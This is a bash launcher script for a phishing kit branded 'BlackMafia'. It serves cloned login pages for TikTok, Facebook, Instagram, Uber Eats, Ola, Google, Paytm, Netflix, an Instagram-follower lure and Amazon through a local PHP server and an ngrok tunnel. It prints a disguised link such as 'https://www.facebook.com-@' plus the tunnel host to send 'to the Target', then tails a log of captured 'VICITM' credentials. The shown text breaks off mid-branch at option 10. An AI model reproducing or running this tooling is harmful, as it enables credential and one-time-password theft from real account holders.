#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m⛔]\e[1;40m\e[10m BlackMafia SERVER Conecting....:\e[1;32m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK!\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[100;330m[\e[10m⛔]\e[1;40m\e[10mHow you use this information is your responsibility\e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
bash Logo.sh
cat Logo.txt | lolcat
echo ""
echo "" 
                 read -p $'\e[1;91m[\e[0m\e[1;91m\e[0m\e[1;96m]\e[0m\e[1;96mChoose Any Options \e[0m'
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd Sites/ 
                           cd tiktok/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.tiktok.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 

                
	          break;
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd Sites/
                           cd facebook/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.facebook.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 


                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd Sites/
                           cd instagram/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.instagram.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
 
                  
                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
	         then
                           cd Sites/
                           cd UberEats-Phishing/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.ubereats.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  
                  
                  
                break;
                elif [ $option = 05 ] || [ $option = 5 ]
	        then 
                           cd Sites/
                           cd ola-otpbypass/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.olacabs.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
	         then
                
                           cd Sites/
                           cd google-otp/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat BlackMafiaLovehacker
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  


                break;
                elif [ $option = 07 ] || [ $option = 7 ]
	        then
                          clear
                          cd Sites/
                          cd Paytm-Phishing/
                          echo 
                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
			  echo
                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
                          echo 
                          read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
		          if [ $option1 = 1 ] || [ $option1 = 01 ]
			  then
                          
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://paytm.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt 
                   else
   
                          cd signup/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://paytm.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt 
                fi
                 
                break;

                elif [ $option = 08 ] || [ $option = 8 ]
	        then

                          cd Sites/
                          cd Netflix/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.netflix.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt      

                break;
                
                elif [ $option = 09 ] || [ $option = 9 ]
	        then

                          cd Sites/
                          cd instafollow/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.instafollowerspro.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 
                    

                break;
                elif [ $option = 10 ] || [ $option = 10 ]
	        then
                          cd Sites/
                          cd amazonsign/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.amazon.in-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
